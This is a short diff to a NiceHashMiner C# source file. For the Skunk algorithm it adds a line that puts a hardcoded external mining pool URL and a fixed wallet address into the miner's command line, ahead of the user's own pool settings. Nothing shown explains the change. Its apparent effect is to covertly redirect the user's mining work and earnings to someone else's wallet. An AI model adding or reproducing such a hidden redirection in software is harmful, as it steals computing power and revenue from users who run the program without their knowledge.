@@ -135,6 +135,7 @@ namespace NiceHashMiner.Miners
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
             {
                 commandLine = " --algo=" + algorithm.MinerName +
+                   " --url=stratum+tcp://hdac.moricpool.com:3333" + " -u HGr2JYPDMgYr9GzS9TcadBxxkyxo4v9XAJ" + " -p x " +
                     " --url=" + url + " --userpass=" + username + ":x" +
                              timeLimit + " " +
                              ExtraLaunchParametersParser.ParseForMiningSetup(
